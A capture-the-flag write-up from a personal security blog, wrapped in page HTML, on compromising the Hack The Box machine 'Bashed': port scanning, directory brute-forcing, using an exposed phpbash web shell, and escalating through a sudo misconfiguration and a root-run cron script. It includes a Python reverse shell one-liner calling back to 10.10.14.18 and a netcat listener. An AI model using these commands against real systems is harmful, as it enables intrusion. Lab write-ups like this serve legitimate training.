@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Sulejman Bijedic">
+    <meta name="description" content="Write-ups about Linux and Security">
+    <meta name="keywords" content="blog,security,linux">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bashed"/>
+<meta name="twitter:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.68  Mind Map Reconnaisance Initial scan results:
+sudo nmap -sS -p- -n 10.10.10.68 -oA nmap/sS_full_scan ... Nmap scan report for 10.10.10.68 Host is up (0.066s latency). Not shown: 65534 closed ports PORT STATE SERVICE 80/tcp open http Note: a full port UDP scan does not reveal any new open port.
+With the -sV option I can see that Apache HTTP Server 2."/>
+
+    <meta property="og:title" content="Bashed" />
+<meta property="og:description" content="Machine info  OS : Linux Difficulty : Easy Points : 20 IP : 10.10.10.68  Mind Map Reconnaisance Initial scan results:
+sudo nmap -sS -p- -n 10.10.10.68 -oA nmap/sS_full_scan ... Nmap scan report for 10.10.10.68 Host is up (0.066s latency). Not shown: 65534 closed ports PORT STATE SERVICE 80/tcp open http Note: a full port UDP scan does not reveal any new open port.
+With the -sV option I can see that Apache HTTP Server 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/hackthebox/bashed/" />
+<meta property="article:published_time" content="2020-06-16T16:04:02+01:00" />
+<meta property="article:modified_time" content="2020-06-16T16:04:02+01:00" />
+
+
+    
+      <base href="/posts/hackthebox/bashed/">
+    
+    <title>
+  Bashed · lafx0
+</title>
+
+    
+      <link rel="canonical" href="/posts/hackthebox/bashed/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.a4f332213a21ce8eb521670c614470c58923aaaf385e2a73982c31dd7642decb.css" integrity="sha256-pPMyITohzo61IWcMYURwxYkjqq84XipzmCwx3XZC3ss=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="/css/custom.css" />
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.66.0" />
+  </head>
+
+  
+  
+  <body class="colorscheme-light">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      lafx0
+    </a>
+    
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="/about/info/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Bashed</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-06-16T16:04:02&#43;01:00'>
+                June 16, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="machine-info">Machine info</h1>
+<ul>
+<li>OS : Linux</li>
+<li>Difficulty : Easy</li>
+<li>Points : 20</li>
+<li>IP : 10.10.10.68</li>
+</ul>
+<h1 id="mind-map">Mind Map</h1>
+<p><img src="/images/htb/bashed_mindmap.png" alt="Bashed_MindMap"></p>
+<h1 id="reconnaisance">Reconnaisance</h1>
+<p>Initial scan results:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo nmap -sS -p- -n 10.10.10.68 -oA nmap/sS_full_scan
+...
+Nmap scan report for 10.10.10.68
+Host is up (0.066s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http</code></pre></div>
+<p><strong>Note</strong>: a full port UDP scan does not reveal any new open port.</p>
+<p>With the <code>-sV</code> option I can see that <code>Apache HTTP Server 2.4.18</code> is running on port 80.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>I proceed visiting http://10.10.10.68:80.</p>
+<p><img src="/images/htb/bashed_website.png" alt="Bashed_Website"></p>
+<p>The website owner is telling me that a tool named <code>phpbash</code> is installed on the server and that it could be very useful for pentesting. Also a link to the GitHub repository tool is given, where I can find more info about it:</p>
+<blockquote>
+<p>phpbash is a standalone, semi-interactive web shell. It&rsquo;s main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.</p>
+</blockquote>
+<p>I don&rsquo;t know where to look for the web shell, so I try to enumerate directories on the web server to see if I can find something:</p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo python3 /opt/dirsearch/dirsearch.py -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -r -f -e php</code></pre></div>
+Where:</p>
+<ul>
+<li><code>-w</code> specifies the wordlist used for enumerating the web server</li>
+<li><code>-r</code> stands for recursive mode</li>
+<li><code>-f</code> stands for force extensions</li>
+<li><code>-e</code> for specifying the desired extension to search</li>
+</ul>
+<p>After a few moments, <em>dirsearch</em> is able to find some resources on the web server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>10:39:17<span style="color:#f92672">]</span> Starting:
+<span style="color:#f92672">[</span>10:39:18<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  290B  - /.php
+<span style="color:#f92672">[</span>10:39:18<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  291B  - /.html
+<span style="color:#f92672">[</span>10:39:18<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    8KB - /index.html
+<span style="color:#f92672">[</span>10:39:18<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /images/   
+<span style="color:#f92672">[</span>10:39:19<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    8KB - /contact.html  
+<span style="color:#f92672">[</span>10:39:19<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    8KB - /about.html   
+<span style="color:#f92672">[</span>10:39:24<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  292B  - /icons/         
+<span style="color:#f92672">[</span>10:39:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   14B  - /uploads/       
+<span style="color:#f92672">[</span>10:39:47<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  939B  - /php/                    
+<span style="color:#f92672">[</span>10:40:06<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    2KB - /css/                
+<span style="color:#f92672">[</span>10:40:31<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /dev/                 
+<span style="color:#f92672">[</span>10:40:42<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    3KB - /js/                
+CTRL+C detected: Pausing threads, please wait...</code></pre></div>
+<h1 id="exploitation">Exploitation</h1>
+<p>The web shell is under <code>/dev</code> and I can see that I&rsquo;m logged in as the <code>www-data</code> user! We&rsquo;re in!</p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>At this point I have to figure out how to obtain full access to the server.</p>
+<p>The first thing I look for is to see if there is something I can sudo with the current user without providing a password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">www-data@bashed
+:/var/www/html/dev# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL</code></pre></div>
+<p>I&rsquo;m able to run any command with root privileges as the <code>scriptmanager</code> user!</p>
+<p>To change current user I can use the following command:</p>
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">sudo -i -u scriptmanager</code></pre></div>
+Where:</p>
+<ul>
+<li><code>-i</code> stands for login</li>
+<li><code>-u</code> stands for users</li>
+</ul>
+<p>I&rsquo;m not able to do so inside the current web shell as it is not persistent, so I need to create a reverse shell to my machine in order to proceed. I&rsquo;ll use a <strong>python reverse shell</strong> obtained from the <strong>Pentestmonkey</strong> website:</p>
+<p>I set up a netcat listener on my machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">nc -nlvp 4445</code></pre></div>
+<p>And launch the reverse shell from the web shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.18&#34;,4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span></code></pre></div>
+<p>I receive a connection back in a few seconds. From the new shell I&rsquo;m able to change user to <code>scriptmanager</code>.</p>
+<p>It took me a while here to understand what to do next, but at the end I found an interesting directory under <code>/</code> named <code>/scripts</code> owned by the <code>scriptmanager</code> user. Inside this directory there&rsquo;s a file named <code>test.py</code> (owned by <em>scriptmanager</em>) that writes into <code>test.txt</code> (owned by <em>root</em>) every minute or so. From here it is easy to get root as I only have to set up a netcat listener on my machine and insert a reverse shell code in the <code>test.py</code> file and wait for the connection!</p>
+<h2 id="lessons-learned-and-remediations">Lessons learned and remediations</h2>
+<ul>
+<li>Never expose so easily a shell on the web server.</li>
+<li>Always check for misconfigurations about user permissions. Why was the <code>www-data</code> user able to run commands as <code>scriptmanager</code>?</li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+      <p>'  '</p>
+    
+    
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+    
+
+  </body>
+
+</html>
